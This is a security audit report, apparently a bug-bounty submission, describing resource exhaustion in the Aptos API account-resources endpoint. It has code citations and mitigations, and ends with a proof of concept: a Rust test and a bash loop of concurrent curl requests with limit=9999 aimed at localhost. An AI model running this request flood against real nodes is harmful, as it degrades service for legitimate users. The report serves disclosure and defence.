# Audit Report

## Title
API Resource Exhaustion via Unbounded Account Resources Query

## Summary
The `get_account_resources()` endpoint lacks rate limiting and allows requests for up to 9,999 resources per query, enabling attackers to exhaust the API's blocking thread pool and degrade service availability for legitimate users through sustained high-cost queries.

## Finding Description

The `/accounts/:address/resources` endpoint allows clients to retrieve account resources with a configurable page limit. The implementation has several critical weaknesses that enable resource exhaustion attacks:

**Vulnerability Chain:**

1. **High Default Limit**: The default `max_account_resources_page_size` is set to 9,999 resources [1](#0-0) 

2. **No Rate Limiting**: The API runtime has no rate limiting middleware, only basic request logging, compression, and POST size limits [2](#0-1) 

3. **Finite Blocking Thread Pool**: Each request is processed via `api_spawn_blocking` on a limited blocking thread pool (default: 2 Ã— CPU cores) [3](#0-2) 

4. **Expensive Processing**: For JSON responses, each resource requires expensive deserialization and conversion operations [4](#0-3) 

**Attack Execution:**

An attacker can execute the following attack:

1. Create or identify accounts with thousands of resources (legitimate accounts like `0x1` already have many resources, and attackers can create their own resource-heavy accounts)
2. Send concurrent requests to `GET /v1/accounts/{address}/resources?limit=9999` 
3. Each request consumes one blocking thread while:
   - Iterating through database state keys [5](#0-4) 
   - Expanding resource groups into individual resources [6](#0-5) 
   - Converting BCS-encoded resources to JSON via expensive `view_resource()` calls [7](#0-6) 

4. With sufficient concurrent requests (matching or exceeding the thread pool size), all blocking threads become occupied
5. Legitimate API requests queue indefinitely, causing timeouts and service degradation
6. The attack can be sustained with minimal cost to the attacker

This breaks the **Resource Limits** invariant (#9) which states "All operations must respect gas, storage, and computational limits" - the API allows unbounded resource consumption without proper controls.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **API Crashes/Unavailability**: By exhausting the blocking thread pool, the API becomes unresponsive to new requests, effectively causing a service outage. This directly matches the "API crashes" category (up to $50,000).

2. **Validator Node Impact**: If validators expose this API endpoint, the attack could cause "Validator node slowdowns" (up to $50,000) by consuming CPU, memory, and I/O resources on validator infrastructure.

3. **Sustained Attack**: Unlike transient issues, this attack can be maintained continuously with low cost to the attacker (just HTTP requests), causing prolonged service degradation.

4. **No Authentication Required**: The endpoint is publicly accessible, requiring no special privileges or authentication to exploit.

The impact is NOT categorized as a "network-level DoS" (which is out of scope), but rather an **application-level resource exhaustion vulnerability** due to missing security controls (rate limiting) combined with excessive default limits.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Low Attack Complexity**: Requires only HTTP GET requests with a query parameter - no special tools or expertise needed
2. **Zero Attack Cost**: No transaction fees or resource acquisition required
3. **Public Attack Surface**: API endpoints are publicly accessible on most Aptos nodes
4. **Readily Available Targets**: Framework account `0x1` and other system accounts have numerous resources suitable for exploitation
5. **No Detection Mechanisms**: Absence of rate limiting means the attack won't trigger automated defenses
6. **Scalable Impact**: A single attacker with modest bandwidth can launch effective attacks from multiple IPs

The test suite confirms accounts can have at least 10 resources [8](#0-7) , and there's no upper bound preventing accounts from having thousands of resources.

## Recommendation

Implement multi-layered protection against resource exhaustion:

**1. Add Rate Limiting Middleware:**
```rust
// In api/src/runtime.rs, add rate limiting middleware
use aptos_rate_limiter::RateLimiter;

// Configure per-IP rate limits
let rate_limiter = RateLimiter::new(
    100,  // max 100 requests
    Duration::from_secs(60), // per 60 seconds
);

// Apply in route configuration (line ~255)
.with(rate_limiter)
```

**2. Reduce Default Page Size:**
```rust
// In config/src/config/api_config.rs line 100
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 100; // Reduced from 9999
```

**3. Add Per-Request Resource Limits:**
```rust
// In api/src/context.rs, add timeout to expensive operations
tokio::time::timeout(
    Duration::from_secs(30),
    get_resources_by_pagination(...)
).await??;
```

**4. Implement Request Complexity Budgets:**
Track cumulative resource consumption per client and throttle based on actual cost, not just request count.

**5. Add Monitoring and Alerting:**
Monitor thread pool utilization and alert on sustained high usage patterns indicative of attack.

## Proof of Concept

```rust
// PoC: Resource exhaustion via concurrent high-limit queries
// Save as: api/tests/resource_exhaustion_test.rs

#[tokio::test]
async fn test_resource_exhaustion_attack() {
    use std::time::Duration;
    use tokio::time::timeout;
    
    // Setup test context
    let context = new_test_context("resource_exhaustion_test");
    let client = reqwest::Client::new();
    let base_url = format!("http://localhost:{}/v1", context.api_port());
    
    // Target: Framework account with many resources
    let target_address = "0x1";
    
    // Launch concurrent expensive requests
    let mut handles = vec![];
    for _ in 0..20 {  // More than typical thread pool size
        let url = format!(
            "{}/accounts/{}/resources?limit=9999",
            base_url, target_address
        );
        let client = client.clone();
        
        let handle = tokio::spawn(async move {
            let start = std::time::Instant::now();
            let result = timeout(
                Duration::from_secs(60),
                client.get(&url).send()
            ).await;
            let elapsed = start.elapsed();
            (result, elapsed)
        });
        handles.push(handle);
    }
    
    // Attempt legitimate request while attack is ongoing
    tokio::time::sleep(Duration::from_millis(100)).await;
    let legitimate_request = timeout(
        Duration::from_secs(5),  // Should be fast
        client.get(&format!("{}/", base_url)).send()
    ).await;
    
    // Verify attack impact
    assert!(
        legitimate_request.is_err() || 
        legitimate_request.unwrap().unwrap().status() == 503,
        "Legitimate request should timeout or fail during attack"
    );
    
    // Cleanup
    for handle in handles {
        handle.await.ok();
    }
}
```

**Manual Testing Steps:**
```bash
# Terminal 1: Launch multiple concurrent requests
for i in {1..20}; do
  curl "http://localhost:8080/v1/accounts/0x1/resources?limit=9999" &
done

# Terminal 2: Try legitimate request (will be delayed/timeout)
time curl "http://localhost:8080/v1/"
```

## Notes

This vulnerability demonstrates a fundamental security principle: **expensive operations must have proportional protection**. The combination of high default limits (9,999 resources), lack of rate limiting, and finite compute resources creates a classic resource exhaustion attack surface. While individual nodes can be hardened through configuration, the secure-by-default principle requires that the default configuration not be exploitable without additional hardening.

### Citations

**File:** config/src/config/api_config.rs (L100-100)
```rust
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 9999;
```

**File:** api/src/runtime.rs (L230-259)
```rust
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);

        // Build routes for the API
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** api/src/runtime.rs (L290-296)
```rust
/// API runtime. Defaults to 2 * number of CPU cores if not specified
/// via the given config.
fn get_max_runtime_workers(api_config: &ApiConfig) -> usize {
    api_config
        .max_runtime_workers
        .unwrap_or_else(|| num_cpus::get() * api_config.runtime_worker_multiplier)
}
```

**File:** api/src/accounts.rs (L474-490)
```rust
            AcceptType::Json => {
                // Resolve the BCS encoded versions into `MoveResource`s
                let state_view = self
                    .context
                    .latest_state_view_poem(&self.latest_ledger_info)?;
                let converter = state_view
                    .as_converter(self.context.db.clone(), self.context.indexer_reader.clone());
                let converted_resources = converter
                    .try_into_resources(resources.iter().map(|(k, v)| (k.clone(), v.as_slice())))
                    .context("Failed to build move resource response from data in DB")
                    .map_err(|err| {
                        BasicErrorWith404::internal_with_code(
                            err,
                            AptosErrorCode::InternalError,
                            &self.latest_ledger_info,
                        )
                    })?;
```

**File:** api/src/context.rs (L477-496)
```rust
        let account_iter = if !db_sharding_enabled(&self.node_config) {
            Box::new(
                self.db
                    .get_prefixed_state_value_iterator(
                        &StateKeyPrefix::from(address),
                        prev_state_key,
                        version,
                    )?
                    .map(|item| item.map_err(|err| anyhow!(err.to_string()))),
            )
        } else {
            self.indexer_reader
                .as_ref()
                .ok_or_else(|| format_err!("Indexer reader doesn't exist"))?
                .get_prefixed_state_value_iterator(
                    &StateKeyPrefix::from(address),
                    prev_state_key,
                    version,
                )?
        };
```

**File:** api/src/context.rs (L536-551)
```rust
        let kvs = kvs
            .into_iter()
            .map(|(tag, value)| {
                if converter.is_resource_group(&tag) {
                    // An error here means a storage invariant has been violated
                    bcs::from_bytes::<ResourceGroup>(&value)
                        .map(|map| map.into_iter().collect::<Vec<_>>())
                        .map_err(|e| e.into())
                } else {
                    Ok(vec![(tag, value)])
                }
            })
            .collect::<Result<Vec<Vec<(StructTag, Vec<u8>)>>>>()?
            .into_iter()
            .flatten()
            .collect();
```

**File:** api/types/src/convert.rs (L85-91)
```rust
    pub fn try_into_resources<'b>(
        &self,
        data: impl Iterator<Item = (StructTag, &'b [u8])>,
    ) -> Result<Vec<MoveResource>> {
        data.map(|(typ, bytes)| self.inner.view_resource(&typ, bytes)?.try_into())
            .collect()
    }
```

**File:** api/src/tests/accounts_test.rs (L550-552)
```rust
    // We assert there are at least 10 resources. If there aren't, the rest of the
    // test will be wrong.
    assert!(all_resources.len() >= 10);
```
